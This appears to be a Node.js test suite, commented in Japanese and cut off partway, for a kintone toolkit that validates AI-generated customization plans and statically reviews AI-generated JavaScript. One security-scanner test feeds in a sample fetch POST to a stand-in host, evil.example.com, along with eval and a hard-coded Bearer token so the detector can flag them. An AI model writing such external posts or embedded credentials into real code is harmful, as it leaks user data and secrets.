// Customization Planner & JavaScript Generator（Phase 16）: 標準設定と JavaScript を統合した計画の Toolkit 検証 / 生成コードの静的検査 / AI Workspace の統合
//
// 検証内容:
//   §51 Planner（Toolkit 側）: 標準のみ / カスタマイズのみ / Hybrid / 既存 JS への統合 / 新規 JS / 統合先が曖昧 / キャッシュで本文なし / PC・モバイル未定 /
//        存在しないイベント / 既存 JS との競合（JS_FIELD_CONFLICT）/ Generator Context（アプリ全体の facts を送らない）
//   §52 Generator（KTCodeReview）: 新規 JS OK / patch OK / 構文エラー / 未知イベント / 未知フィールド / 計画外のフィールド書き換え / 計画外 API /
//        計画との不一致 / 危険 API / 秘密情報 / 外部通信 / anchor 不明 / baseHash 不一致 / グローバル汚染 / return event なし
//   §53 Chat: Hybrid の計画カード / カスタマイズの修正 / 「コードを作って」/ コードカード / Diff / コピー / 説明 / Q&A は影響なし /
//        Preview Executor は JS を反映しない / 「これで進めて」はコードを作らない / 本文が無いときの JS_SOURCE_UNAVAILABLE → 再スキャン / 契約に無い
//
// 実行方法: node tests/ai-customization.test.js
'use strict';
const { loadToolkit, makeAssert } = require('./helpers/load-toolkit.js');
const { makeFakeHost } = require('./helpers/fake-dom.js');
const { KTDeps, KTScan, KTContext, KTAiClient, KTAiConversation, KTAiChatUi, KTContextUi, KTPlanReview, KTCodeReview, KTJsCatalog, KTPlanExecutor, mountAiWorkspace } = loadToolkit();
const { assert, state } = makeAssert();
const FX = require('./fixtures/ai-context-app.js');
const { buildScanPayload } = require('./helpers/scan-payload.js');
const { makeKintoneMock } = require('./helpers/kintone-preview-mock.js');

// 既存 JS: 承認待ちのとき金額を編集不可にする（E2E の app 346 に登録するものと同じ形）
const FIELD_ON_OFF = [
  "(function () {",
  "  'use strict';",
  "  kintone.events.on(['app.record.create.show', 'app.record.edit.show'], function (event) {",
  "    const record = event.record;",
  "    if (record['ステータス'].value === '承認待ち') {",
  "      record['amount'].disabled = true;",
  "    }",
  "    return event;",
  "  });",
  "})();",
].join('\n');
const FIELD_ON_OFF_FILE = { name: 'fieldOnOff.js', target: 'desktop', kind: 'js', text: FIELD_ON_OFF };

/** 入力（data / deps / scan / incoming）。withFieldOnOff: 既存 JS を足す。sourceText: false なら Scanner のキャッシュ payload（本文なし） */
function buildInputs({ withFieldOnOff = true, sourceText = true } = {}) {
  const data = FX.makeData();
  if (withFieldOnOff) data.customize.desktop.js.push({ type: 'FILE', file: { contentType: 'text/javascript', fileKey: '20261003000000EEEE', name: 'fieldOnOff.js', size: '300' } });
  const fieldsN = KTDeps.normalizeFields(data.fields);
  const deps = KTDeps.buildDependencyData(data, fieldsN);
  const files = withFieldOnOff ? [...FX.files, FIELD_ON_OFF_FILE] : [...FX.files];
  const fieldRows = fieldsN.map(f => ({ code: f.code, label: f.label, type: f.rawType }));
  const scan = buildScanPayload({ KTScan, KTDeps }, { appId: FX.SELF_APP, files, fields: fieldRows, deps, skippedUrlFiles: FX.skippedUrlFiles });
  scan.results = KTScan.analyze({ fields: fieldRows, files: files.filter(f => f.kind === 'js'), snippet: { before: 24, after: 48 } });   // 実スキャナの access 分類（.disabled = → CONTROL）
  if (!sourceText) scan.files = scan.files.map(f => ({ name: f.name, target: f.target, kind: f.kind, ...(f.note ? { note: f.note } : {}) }));
  KTDeps.mergeScannerEdges(deps, scan);
  KTDeps.applyIncomingRefs(deps, FX.incoming);
  return { data, deps, scan, incoming: FX.incoming };
}
const INPUTS = buildInputs();
const INPUTS_PLAIN = buildInputs({ withFieldOnOff: false });
const INPUTS_CACHED = buildInputs({ sourceText: false });

const GOAL_HYBRID = '100万円以上なら部長承認にして、承認後は金額を編集できなくしたい';
const spec = (o) => ({ name: null, from: null, to: null, filterCond: null, assignees: [], targets: [], events: [], timingField: null, daysLater: null, time: null, fields: [], sort: null, sourceApp: null, keyField: null, mappings: [], fieldType: null, required: null, options: [], destApp: null, accessibility: null, entities: [], customizationId: null, ...o });
const mkStep = (id, actionType, targetKind, targetRef, sp, extra = {}) => ({ id, actionType, targetKind, targetRef, targetExists: null, title: `${id} ${actionType}`, proposal: { summary: '', details: [] }, spec: spec(sp), dependsOn: [], reason: '', evidenceIds: [], confidence: 'INFERRED', alternativeId: null, validation: { status: 'ok', issues: [] }, execution: { mode: 'PLAN_ONLY', supported: false, reason: 'x' }, ...extra });
const META = { requestId: 'pl-h1', gateway: { product: 'toolkit', feature: 'change-planner', promptVersion: '1', contextVersion: 'planner-1' }, normalization: { warnings: [] }, ai: { model: 'm' }, usage: { usedThisMonth: 1, monthlyLimit: 20 } };
const cust = (o = {}) => ({ customizationId: 'C1', requirement: '承認後（完了）は金額を編集できなくする', whyStandardInsufficient: 'フィールドのアクセス権はステータスで切り替えられない', strategy: 'EXTEND_EXISTING_JS', platform: ['desktop'], events: ['app.record.edit.show'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [], existingFiles: [{ name: 'fieldOnOff.js', target: 'desktop', reason: '同じフィールド（金額）を制御している' }], risks: [], questions: [], dependsOn: [], evidenceIds: [], ...o });
const STD_STEP = () => mkStep('P1', 'ADD_VIEW', 'VIEW', '承認済み', { name: '承認済み', fields: ['case_name', 'amount', 'approver'], filterCond: 'ステータス in ("完了")', sort: 'due_date asc' }, { title: '一覧「承認済み」を追加', solution: 'STANDARD' });
const JS_STEP = (cid = 'C1', extra = {}) => mkStep('P2', 'CUSTOMIZATION_REQUIRED', 'JS', 'fieldOnOff.js', { customizationId: cid }, { title: '承認後は金額を編集できなくする（JavaScript）', solution: 'CUSTOMIZATION', ...extra });
const planOf = ({ steps, customizations = [], solution = null, goal = GOAL_HYBRID, questions = [], requestId = 'pl-h1' }) => ({
  ok: true, contractVersion: '2.1', meta: { ...META, requestId },
  plan: { goal, ...(solution ? { solution } : {}), assessment: { summary: '承認フローは標準のプロセス管理、承認後のロックは JavaScript が必要です。', usableExistingFields: [], usableExistingSettings: [], missingCapabilities: [], uncertainties: [] }, relevantFields: [], proposedFields: [], steps, customizations, alternatives: [], impact: [], questions, unknowns: [], planConfidence: 'INFERRED' },
});
const PLAN_HYBRID = planOf({ steps: [STD_STEP(), JS_STEP()], customizations: [cust()], solution: 'HYBRID' });
const PLAN_STD = planOf({ steps: [STD_STEP()], solution: 'STANDARD', goal: '承認済みの一覧を追加したい' });
const PLAN_JS_ONLY = planOf({ steps: [JS_STEP()], customizations: [cust()], solution: 'CUSTOMIZATION', goal: '承認後は金額を編集できなくしたい' });
const NEW_JS_CUST = () => cust({ customizationId: 'C1', requirement: '金額が100万円以上なら警告メッセージを表示する', whyStandardInsufficient: '入力中の値に応じたメッセージ表示は標準設定にない', strategy: 'NEW_JS_FILE', platform: ['desktop'], events: ['app.record.create.change.amount', 'app.record.edit.change.amount'], fields: [{ code: 'amount', access: 'CONTROL' }], existingFiles: [] });
const PLAN_NEW_JS = planOf({ steps: [JS_STEP('C1', { title: '金額が100万円以上なら警告メッセージを表示（JavaScript）', targetRef: null })], customizations: [NEW_JS_CUST()], solution: 'CUSTOMIZATION', goal: '金額が100万円以上なら警告メッセージを表示したい' });

/** Planner Context → client 側の validatePlan（会話経路と同じ）→ KTPlanReview.review */
function reviewPlan(resp, inputs = INPUTS) {
  const gen = KTContextUi.generatePlan({ goal: resp.plan.goal, inputs });
  const v = KTAiClient.validatePlan(resp, gen.ctx);
  if (!v.ok) throw new Error(`validatePlan failed: ${JSON.stringify(v.errors)}`);
  const plan = { ...v.normalized, requestId: resp.meta.requestId };
  const review = KTPlanReview.review({ plan, ...inputs });
  return { plan, review, ctx: gen.ctx, jsReview: (review.steps || []).find(r => r.solution === 'CUSTOMIZATION') || null };
}
const hash = (t) => KTScan.hashText(t);
const NEW_JS_GOOD = [
  "(function () {",
  "  'use strict';",
  "  kintone.events.on(['app.record.create.change.amount', 'app.record.edit.change.amount'], function (event) {",
  "    const record = event.record;",
  "    const amount = Number(record['amount'].value || 0);",
  "    record['amount'].error = amount >= 1000000 ? '100万円以上は部長の承認が必要です' : null;",
  "    return event;",
  "  });",
  "})();",
].join('\n');
const PATCH_GOOD = {
  baseHash: hash(FIELD_ON_OFF),
  operations: [{ type: 'INSERT_AFTER', anchor: "      record['amount'].disabled = true;\n    }", content: "    if (record['ステータス'] && record['ステータス'].value === '完了') {\n      record['amount'].disabled = true;\n    }" }],
};
const PATCH_ADDED = PATCH_GOOD.operations[0].content;
/** Gateway の応答（generated）。validateGenerated を通して会話経路と同じ形にする */
const genResponse = (ctx, g) => ({ ok: true, contractVersion: '2.1', meta: { requestId: 'gen-1', usage: { usedThisMonth: 3, monthlyLimit: 20 }, normalization: { warnings: [] }, gateway: { feature: 'customization-generator' } }, generated: { strategy: ctx.customization.strategy, targetFile: ctx.existingFile?.name || 'amountWarning.js', summary: ctx.customization.requirement, events: ctx.customization.events, fields: ctx.customization.fields, apis: [], assumptions: [], warnings: [], gatewayChecks: { security: [] }, ...g } });
const genNew = (code = NEW_JS_GOOD, g = {}) => ({ strategy: 'NEW_JS_FILE', targetFile: 'amountWarning.js', summary: '金額の警告', code, patch: null, events: ['app.record.create.change.amount', 'app.record.edit.change.amount'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [], assumptions: [], warnings: [], ...g });
const genPatch = (patch = PATCH_GOOD, g = {}) => ({ strategy: 'EXTEND_EXISTING_JS', targetFile: 'fieldOnOff.js', summary: '完了でも金額を編集不可にする', code: patch.operations.map(o => o.content).join('\n'), patch, events: ['app.record.edit.show'], fields: [{ code: 'amount', access: 'CONTROL' }], apis: [], assumptions: [], warnings: [], ...g });
const check = (rv, name) => (rv.checks || []).find(c => c.name === name) || null;
const SRC = { name: 'fieldOnOff.js', target: 'desktop', text: FIELD_ON_OFF };
const tick = () => new Promise(r => setTimeout(r, 0));
const ticks = async (n = 4) => { for (let i = 0; i < n; i++) await tick(); };

(async () => {
// =========================================================
console.log('\n--- §51-1. KTJsCatalog（決定的な Event / API Catalog）---');
{
  assert(KTJsCatalog.checkEvent('app.record.edit.show').ok && KTJsCatalog.checkEvent('mobile.app.record.create.show').ok, 'Event Catalog: 既知のイベント');
  const bad = KTJsCatalog.checkEvent('app.record.update.show');
  assert(bad.ok === false, 'Event Catalog: app.record.update.show は存在しない（計画・コードの両方で拒否する根拠）');
  const ch = KTJsCatalog.checkEvent('app.record.create.change.amount', { fields: ['amount'] });
  assert(ch.ok && ch.field === 'amount' && KTJsCatalog.checkEvent('app.record.create.change.nope', { fields: ['amount'] }).ok === false, 'change イベントはフィールドの実在を確認する');
  assert(KTJsCatalog.eventPlatform('mobile.app.record.edit.show') === 'mobile' && KTJsCatalog.eventPlatform('app.record.edit.show') === 'desktop', 'イベントの platform');
  const sec = KTJsCatalog.scanSecurity("fetch('https://evil.example.com/x', { method: 'POST', body: '1' }); eval('1'); const h = { Authorization: 'Bearer abcdefghijklmnop1234' };");
  assert(sec.some(x => x.severity === 'block') && sec.length >= 3, `Security rules: 外部 POST / eval / Authorization を検出（${sec.length} 件）`);
}

// =========================================================
console.log('\n--- §51-2. Toolkit Review: 標準のみ / カスタマイズのみ / Hybrid ---');
{
  const std = reviewPlan(PLAN_STD);
  assert(std.plan.solution === 'STANDARD' && std.plan.customizations.length === 0 && std.review.hybrid.solution === 'STANDARD' && std.review.summary.counts.customizations === 0, '標準のみ: solution STANDARD・customizations なし');
  const js = reviewPlan(PLAN_JS_ONLY);
  assert(js.plan.solution === 'CUSTOMIZATION' && js.review.hybrid.solution === 'CUSTOMIZATION' && js.review.hybrid.standard.steps.length === 0 && js.review.hybrid.customization.steps.length === 1, 'カスタマイズのみ: solution CUSTOMIZATION');
  const hy = reviewPlan(PLAN_HYBRID);
  assert(hy.plan.solution === 'HYBRID' && hy.review.hybrid.solution === 'HYBRID' && hy.review.hybrid.standard.steps.includes('P1') && hy.review.hybrid.customization.steps.includes('P2'), 'Hybrid: 標準設定 P1 ＋ JavaScript P2 を同じ Review 上で分けて要約');
  assert(hy.jsReview && hy.jsReview.solution === 'CUSTOMIZATION' && hy.jsReview.safety === 'PLAN_ONLY' && hy.jsReview.customization.customizationId === 'C1', 'JS の step は PLAN_ONLY（Executor は反映しない）・customization を保持');
  assert(hy.jsReview.codeGeneration.supported === true && hy.jsReview.codeGeneration.strategy === 'EXTEND_EXISTING_JS' && hy.jsReview.codeGeneration.existingFile?.name === 'fieldOnOff.js' && hy.jsReview.codeGeneration.sourceAvailable === true, '既存 JS への統合: 統合先 fieldOnOff.js を解決・本文あり・コード生成可');
  assert(hy.review.executionReadiness.generatableSteps.includes('P2') && hy.review.hybrid.customization.generatable.includes('P2'), 'executionReadiness.generatableSteps に P2');
  assert(hy.review.executionReadiness.planOnlySteps.includes('P2') && !hy.review.executionReadiness.safeSteps.includes('P2'), 'JS は safeSteps に入らない（Executor の対象外）');
  const out = KTPlanReview.executorOutput(hy.plan, hy.review, ['P1', 'P2']);
  const cls = KTPlanExecutor.classifySteps(out);
  assert(cls.find(x => x.stepId === 'P2')?.status === 'UNSUPPORTED' && cls.find(x => x.stepId === 'P1')?.status === 'PENDING', 'Executor の分類: P1 は PENDING（実行可）・JS の P2 は UNSUPPORTED（反映しない）');
  assert(out.plan.solution === 'HYBRID' && out.plan.customizations?.length === 1 && out.review.hybrid?.customization?.steps?.includes('P2'), 'executorOutput に solution / customizations / hybrid が残る（監査 JSON）');
  // 新規 JS
  const nw = reviewPlan(PLAN_NEW_JS);
  assert(nw.jsReview.codeGeneration.supported === true && nw.jsReview.codeGeneration.strategy === 'NEW_JS_FILE' && nw.jsReview.codeGeneration.existingFile === null, '新規 JS: NEW_JS_FILE でコード生成可');
  assert(nw.jsReview.issues.some(i => i.code === 'JS_FIELD_CONFLICT' && i.file === 'fieldOnOff.js') && nw.jsReview.status === 'NEEDS_CONFIRMATION' && nw.review.hybrid.customization.conflicts.includes('P2'), '既存 JS（fieldOnOff.js）が同じ amount を CONTROL → JS_FIELD_CONFLICT（REVIEW_REQUIRED・統合を検討）');
  const nwPlain = reviewPlan(PLAN_NEW_JS, INPUTS_PLAIN);
  assert(!nwPlain.jsReview.issues.some(i => i.code === 'JS_FIELD_CONFLICT') && nwPlain.jsReview.status === 'VALID', '同じフィールドを扱う既存 JS が無ければ競合なし（VALID）');
}

// =========================================================
console.log('\n--- §51-3. Toolkit Review: 統合先が曖昧 / 本文なし / PC・モバイル未定 / 未知イベント / 理由なし ---');
{
  const ambiguous = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ existingFiles: [] })] }));
  assert(ambiguous.jsReview.issues.some(i => i.code === 'JS_TARGET_FILE_MISSING') && ambiguous.jsReview.codeGeneration.supported === false && ambiguous.jsReview.codeGeneration.reason === 'TARGET_FILE_MISSING', '統合先が曖昧（existingFiles なし）: JS_TARGET_FILE_MISSING・生成不可');
  const notFound = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ existingFiles: [{ name: 'ghost.js', target: 'desktop', reason: '' }] })] }));
  assert(notFound.jsReview.status === 'INVALID' && notFound.jsReview.issues.some(i => i.code === 'JS_TARGET_FILE_NOT_FOUND'), '登録されていないファイルへの統合: INVALID（実行不可）');
  const cached = reviewPlan(PLAN_HYBRID, INPUTS_CACHED);
  assert(cached.jsReview.codeGeneration.sourceAvailable === false && cached.jsReview.issues.some(i => i.code === 'JS_SOURCE_UNAVAILABLE') && cached.jsReview.codeGeneration.supported === true, 'キャッシュ payload（本文なし）: JS_SOURCE_UNAVAILABLE（低）。生成時に取得を試みる');
  const noPlatform = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ platform: [] })] }));
  assert(noPlatform.jsReview.issues.some(i => i.code === 'JS_PLATFORM_UNSPECIFIED') && noPlatform.jsReview.codeGeneration.supported === false && noPlatform.jsReview.codeGeneration.reason === 'PLATFORM_UNSPECIFIED' && noPlatform.jsReview.status === 'NEEDS_CONFIRMATION', 'PC / モバイル未定: 確認が必要・生成不可（勝手に desktop にしない）');
  const badEvent = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ events: ['app.record.update.show'] })] }));
  assert(badEvent.jsReview.status === 'INVALID' && badEvent.jsReview.issues.some(i => i.code === 'JS_EVENT_UNKNOWN') && badEvent.jsReview.codeGeneration.supported === false, '存在しないイベント app.record.update.show: INVALID');
  const noReason = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ whyStandardInsufficient: '' })] }));
  assert(noReason.jsReview.issues.some(i => i.code === 'JS_REASON_MISSING') && noReason.jsReview.status === 'NEEDS_CONFIRMATION', '標準設定で不足する理由が無い: 確認が必要');
  const wrongScreen = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ events: ['app.record.detail.show'] })] }));
  assert(wrongScreen.jsReview.issues.some(i => i.code === 'JS_SCREEN_MISMATCH'), 'CONTROL するのに詳細画面のイベントだけ: JS_SCREEN_MISMATCH');
  const unknownField = reviewPlan(planOf({ steps: [JS_STEP()], customizations: [cust({ fields: [{ code: 'amount', access: 'CONTROL' }, { code: 'nope_field', access: 'READ' }] })] }));
  assert(unknownField.jsReview.status === 'INVALID' && unknownField.jsReview.issues.some(i => i.code === 'JS_FIELD_UNKNOWN'), '存在しないフィールドを計画に含む: INVALID');
  const missing = reviewPlan(planOf({ steps: [JS_STEP('C9')], customizations: [cust()] }));
  assert(missing.jsReview.status === 'INVALID' && missing.jsReview.issues.some(i => i.code === 'CUSTOMIZATION_NOT_FOUND'), 'step が指す customization が無い: INVALID');
  // 実機（Scenario A 2 回目）: 依存する標準設定（新しいステータス等）が無効 → JS は BLOCKED_BY_DEPENDENCY で生成不可（存在しない設定名を前提にしたコードを作らない）
  const depBad = reviewPlan(planOf({ steps: [mkStep('P1', 'ADD_FIELD', 'PROPOSED_FIELD', 'NEW_FIELD_9', { fieldType: 'DROP_DOWN', options: ['a'] }, { title: '提案に無い新規フィールド' }), JS_STEP('C1', { dependsOn: ['P1'] })], customizations: [cust({ dependsOn: ['P1'] })], solution: 'HYBRID' }));
  assert(depBad.jsReview.status === 'BLOCKED_BY_DEPENDENCY' && depBad.jsReview.codeGeneration.supported === false && depBad.jsReview.codeGeneration.reason === 'BLOCKED_BY_DEPENDENCY' && depBad.review.hybrid.customization.blocked.includes('P2') && !depBad.review.hybrid.customization.generatable.includes('P2'), '依存する標準設定が無効: JS は BLOCKED_BY_DEPENDENCY・生成不可（generatable に入らない）');
  assert(/前提の標準設定が無効/.test(KTContextUi.planHtml(depBad.plan, depBad.review)), '確認結果: 生成できない理由を日本語で');
  // 実機（Scenario C）: 「警告メッセージを表示」なのに amount が READ → 生成コード（error = CONTROL）と計画が不一致になる → ヒント（低）
  const readOnly = reviewPlan(planOf({ steps: [JS_STEP('C1', { title: '金額が100万円以上なら警告メッセージを表示（JavaScript）' })], customizations: [{ ...NEW_JS_CUST(), fields: [{ code: 'amount', access: 'READ' }, { code: 'ステータス', access: 'READ' }] }] }), INPUTS_PLAIN);
  assert(readOnly.jsReview.issues.some(i => i.code === 'JS_ACCESS_HINT' && i.severity === 'low') && readOnly.jsReview.codeGeneration.supported === true, '要件が警告表示なのに CONTROL のフィールドが無い（複数フィールドで自動調整の対象外）: JS_ACCESS_HINT（低。生成は可能）');
  assert(!reviewPlan(PLAN_NEW_JS, INPUTS_PLAIN).jsReview.issues.some(i => i.code === 'JS_ACCESS_HINT'), 'amount が CONTROL ならヒントなし');
  // validatePlan（client）: customizations の正規化と solution の導出
  const gen = KTContextUi.generatePlan({ goal: GOAL_HYBRID, inputs: INPUTS });
  const v = KTAiClient.validatePlan(planOf({ steps: [STD_STEP(), JS_STEP()], customizations: [cust({ platform: ['desktop', 'tablet'], fields: [{ code: 'amount', access: 'ADMIN' }], evidenceIds: ['E999'] })] }), gen.ctx);
  assert(v.ok && v.normalized.solution === 'HYBRID' && v.normalized.customizations[0].platform.join() === 'desktop' && v.normalized.customizations[0].fields[0].access === 'CONTROL' && v.normalized.customizations[0].evidenceIds.length === 0 && v.warnings.some(w => w.code === 'UNKNOWN_EVIDENCE_REMOVED') && v.warnings.some(w => w.code === 'CUSTOMIZATION_ACCESS_ADJUSTED'), 'validatePlan: platform / access の語彙外を落とし（唯一の READ は要件が編集不可なので CONTROL）、未知の根拠ID を除去、solution を導出');
  // 実機（Scenario C）: 「PC とモバイル両方で必要か」を質問しながら両方を platform に入れる → 空に（Gateway の validate-plan と同じ正規化）
  const vq = KTAiClient.validatePlan(planOf({ steps: [JS_STEP()], customizations: [{ ...NEW_JS_CUST(), platform: ['desktop', 'mobile'], questions: ['PCとモバイル両方で必要か？'] }] }), gen.ctx);
  assert(vq.ok && vq.normalized.customizations[0].platform.length === 0 && vq.warnings.some(w => w.code === 'CUSTOMIZATION_PLATFORM_QUESTIONED'), 'validatePlan: PC / モバイルの要否を質問しながら両方 → platform []（Review が PLATFORM_UNSPECIFIED で止める）');
  const vq2 = KTAiClient.validatePlan(planOf({ steps: [JS_STEP()], customizations: [{ ...NEW_JS_CUST(), platform: ['desktop', 'mobile'], events: ['app.record.create.change.amount', 'mobile.app.record.create.change.amount'], questions: ['警告の文言は？'] }] }), gen.ctx);
  assert(vq2.ok && vq2.normalized.customizations[0].platform.join() === 'desktop,mobile', '質問が platform の要否でなければ両方のまま');
}

// =========================================================
console.log('\n--- §51-4. Planner Context の js-file facts と Generator Context ---');
{
  const gen = KTContextUi.generatePlan({ goal: GOAL_HYBRID, inputs: INPUTS });
  const jsFacts = gen.ctx.facts.filter(f => f.kind === 'js-file');
  assert(jsFacts.length >= 1 && jsFacts.some(f => /fieldOnOff\.js/.test(f.statement) && /amount/.test(f.statement)), `Planner Context: js-file facts に fieldOnOff.js（amount を制御）がある（${jsFacts.length} 件）`);
  assert(Array.isArray(gen.ctx.dictionary.jsFiles) && gen.ctx.dictionary.jsFiles.some(x => /fieldOnOff\.js/.test(x)), 'dictionary.jsFiles に登録済み JS');
  const hy = reviewPlan(PLAN_HYBRID);
  const c = hy.plan.customizations[0];
  const gctx = KTContext.buildGenerator({ customization: c, plan: hy.plan, planId: 'plan-1', version: 1, data: INPUTS.data, deps: INPUTS.deps, scan: INPUTS.scan, existingSource: SRC });
  assert(gctx.contextVersion === KTContext.GENERATOR_CONTEXT_VERSION && gctx.customization.customizationId === 'C1' && gctx.customization.strategy === 'EXTEND_EXISTING_JS', 'Generator Context: contextVersion customization-1・承認済み customization');
  assert(gctx.facts === undefined && !('retrieval' in gctx) && gctx.fields.length <= 4 && gctx.fields.some(f => f.code === 'amount') && gctx.fields.some(f => f.type === 'STATUS'), 'アプリ全体の facts は送らない。関係するフィールド（amount）＋ ステータスだけ');
  assert(gctx.existingFile && gctx.existingFile.hash === hash(FIELD_ON_OFF) && gctx.existingFile.source === FIELD_ON_OFF && gctx.existingFile.analysis.events.includes('app.record.edit.show') && gctx.existingFile.analysis.fields.some(f => f.code === 'amount'), '統合先の本文・指紋（baseHash）・解析（イベント / フィールド）を渡す');
  assert(gctx.otherFiles.every(f => f.name !== 'fieldOnOff.js') && gctx.otherFiles.some(f => f.name === 'common.js'), '他の JS は要約だけ（統合先は除く）');
  assert(gctx.dictionary.fieldCodes.includes('amount') && gctx.dictionary.statuses.includes('承認待ち') && gctx.constraints.noNetwork === true && gctx.constraints.patchOnly === true && gctx.plan.standardSteps.some(s => s.id === 'P1'), 'dictionary（フィールドコード・ステータス名）・制約（通信なし・patch のみ）・関係する標準設定の step');
  const env = KTAiClient.buildGenerateEnvelope({ ctx: gctx, requestId: 'r1' });
  assert(env.meta.feature === KTAiClient.FEATURE_GENERATOR && env.meta.feature === 'customization-generator' && env.meta.contextVersion === 'customization-1' && env.payload === gctx, 'envelope: feature customization-generator（Planner と別 feature）');
  let threw = null; try { KTAiClient.buildGenerateEnvelope({ ctx: { contextVersion: 'x' } }); } catch (e) { threw = e; }
  assert(threw && threw.code === KTAiClient.ERROR_CODES.NO_CONTEXT, 'customization の無い ctx は送れない');
  const vg = KTAiClient.validateGenerated(genResponse(gctx, genPatch()), gctx);
  assert(vg.ok && vg.normalized.strategy === 'EXTEND_EXISTING_JS' && vg.normalized.patch?.operations?.length === 1 && vg.normalized.requestId === 'gen-1', 'validateGenerated: strategy / code / patch を正規化');
  const vgBad = KTAiClient.validateGenerated(genResponse(gctx, genPatch(PATCH_GOOD, { patch: null })), gctx);
  assert(!vgBad.ok && vgBad.errors[0].code === KTAiClient.ERROR_CODES.INVALID_RESPONSE, 'EXTEND_EXISTING_JS なのに patch が無い応答は拒否');
  const vgMis = KTAiClient.validateGenerated(genResponse(gctx, genNew()), gctx);
  assert(vgMis.ok && vgMis.warnings.some(w => w.code === 'STRATEGY_MISMATCH'), '方針が計画と違えば warning（Toolkit Code Review が計画との照合を行う）');
}

// =========================================================
console.log('\n--- §52-1. KTCodeReview: 新規 JS OK / patch OK ---');
{
  const nw = reviewPlan(PLAN_NEW_JS, INPUTS_PLAIN);
  const prov = { planId: 'plan-1', planVersion: 1, customizationId: 'C1', generatedAt: '2026-10-03T00:00:00.000Z', appId: '310', requestId: 'gen-1' };
  const rv = KTCodeReview.review({ generated: genNew(), customization: nw.plan.customizations[0], plan: nw.plan, data: INPUTS_PLAIN.data, scan: INPUTS_PLAIN.scan, existingSource: null, provenance: prov });
  assert(rv.status === 'OK', `新規 JS（妥当）: status OK（${(rv.checks || []).filter(c => !c.ok).map(c => `${c.name}: ${c.message}`).join(' / ') || 'すべて ✓'}）`);
  assert(check(rv, 'syntax')?.ok && check(rv, 'events')?.ok && check(rv, 'fields')?.ok && check(rv, 'security')?.ok && check(rv, 'globals')?.ok && check(rv, 'return-event')?.ok && check(rv, 'plan-consistency')?.ok, 'チェック項目: 構文 / イベント / フィールド / セキュリティ / グローバル汚染 / return event / 計画との一致');
  assert(rv.finalCode === NEW_JS_GOOD && rv.diff && rv.diff.added === NEW_JS_GOOD.split('\n').length && rv.diff.removed === 0, '新規 JS: finalCode ＝ 全文・diff は全行追加');
  assert(rv.rescan && rv.rescan.events.map(e => e.name).includes('app.record.create.change.amount') && rv.rescan.fieldAccess.amount && rv.rescan.fieldAccess.amount.CONTROL, 'KTScan の再解析（仮想ファイル）: イベント・amount CONTROL');
  assert(rv.provenance && rv.provenance.planId === 'plan-1' && rv.provenance.customizationId === 'C1' && rv.provenance.codeHash === hash(NEW_JS_GOOD) && rv.provenance.reviewedAt, 'provenance（計画・版・customization・requestId・コードの指紋）');
  // 既存 JS への patch
  const hy = reviewPlan(PLAN_HYBRID);
  const rp = KTCodeReview.review({ generated: genPatch(), customization: hy.plan.customizations[0], plan: hy.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: SRC });
  assert(rp.status === 'OK', `既存 JS への patch（妥当）: status OK（${(rp.checks || []).filter(c => !c.ok).map(c => `${c.name}: ${c.message}`).join(' / ') || 'すべて ✓'}）`);
  assert(check(rp, 'patch')?.ok && rp.diff.added === 3 && rp.diff.removed === 0 && rp.finalCode.includes(FIELD_ON_OFF.split('\n')[2]) && rp.finalCode.includes("value === '完了'"), 'patch: 既存の行は保持（削除 0）・3 行追加・最終コードは既存 ＋ 追加');
  assert(check(rp, 'handler')?.ok && /既存の handler/.test(check(rp, 'handler').message), '既存 handler の中へ追加（kintone.events.on を重複登録しない）');
  assert(rp.patch?.applied === 1 && rp.patch.afterHash === hash(rp.finalCode) && typeof rp.diffText === 'string' && /\+\s*if \(record\['ステータス'\] && record\['ステータス'\]\.value === '完了'\)/.test(rp.diffText), 'patch の適用結果（afterHash）と Before / After の diff テキスト');
  assert(!check(rp, 'duplicate-handler') || check(rp, 'duplicate-handler').ok, '重複 handler なし');
}

// =========================================================
console.log('\n--- §52-2. KTCodeReview: 構文 / 未知イベント / 未知フィールド / 計画外 / API / 危険 / 秘密 / 外部通信 / patch 失敗 / 作法 ---');
{
  const nw = reviewPlan(PLAN_NEW_JS, INPUTS_PLAIN);
  const c = nw.plan.customizations[0];
  const run = (code, g = {}) => KTCodeReview.review({ generated: genNew(code, g), customization: c, plan: nw.plan, data: INPUTS_PLAIN.data, scan: INPUTS_PLAIN.scan, existingSource: null });
  const syn = run(NEW_JS_GOOD.replace('return event;', 'return event'.slice(0, 6) + ' event event;'));
  assert(syn.status === 'BLOCKED' && check(syn, 'syntax') && !check(syn, 'syntax').ok, '構文エラー: BLOCKED（parse のみ。実行しない）');
  const badEv = run(NEW_JS_GOOD.replace("'app.record.edit.change.amount'", "'app.record.update.show'"));
  assert(badEv.status === 'BLOCKED' && !check(badEv, 'events').ok && /app\.record\.update\.show/.test(check(badEv, 'events').message), '存在しないイベント app.record.update.show: BLOCKED');
  const badField = run(NEW_JS_GOOD.replace("record['amount'].value", "record['amount_total'].value"));
  assert(badField.status === 'BLOCKED' && !check(badField, 'fields').ok && /GENERATED_JS_UNKNOWN_FIELD/.test(check(badField, 'fields').message) && /amount_total/.test(check(badField, 'fields').message), '存在しないフィールド amount_total: GENERATED_JS_UNKNOWN_FIELD（BLOCKED）');
  // Phase 20: 計画外の書き換えは error を設定しない別の handler で確かめる（同じ change イベントで error と value を設定すると、kintone が value を取り消すので別の検査で BLOCKED になる）
  const extraWrite = run(NEW_JS_GOOD.replace("})();", "  kintone.events.on(['app.record.create.show'], function (event) {\n    event.record['approver'].value = [];\n    return event;\n  });\n})();"));
  assert(extraWrite.status === 'BLOCKED' && !check(extraWrite, 'target-fields').ok && check(extraWrite, 'target-fields').severity === 'block' && /approver/.test(check(extraWrite, 'target-fields').message) && extraWrite.registration.verdict === 'BLOCKED' && extraWrite.mismatches.some(m => m.code === 'EXTRA_FIELD_WRITE' && m.items.includes('approver')), '計画に無いフィールド（approver）の書き換え: 対象と異なるフィールド → 登録不可（Phase 21。以前は確認が必要の扱い）');
  const errorAndValue = run(NEW_JS_GOOD.replace("    return event;", "    record['approver'].value = [];\n    return event;"));
